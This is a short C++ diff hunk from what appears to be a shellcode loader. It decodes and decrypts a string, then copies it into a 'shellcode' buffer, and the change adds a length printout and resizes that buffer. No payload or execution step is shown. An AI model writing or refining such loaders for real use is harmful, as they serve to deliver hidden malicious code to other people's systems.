@@ -20,7 +20,8 @@ std::string Base64Decode(std::string*);";
     decrypted.erase(std::find(decrypted.end() - 1, decrypted.end(), '\0'), decrypted.end());
 
     // To unsigned char
-	unsigned char shellcode[decrypted.length() + 1];
+    std::cout << ""shellcode length: "" << decrypted.length() << std::endl;
+	unsigned char shellcode[decrypted.length()];
 	std::copy(decrypted.data(), decrypted.data() + decrypted.length(), shellcode);";
 
 
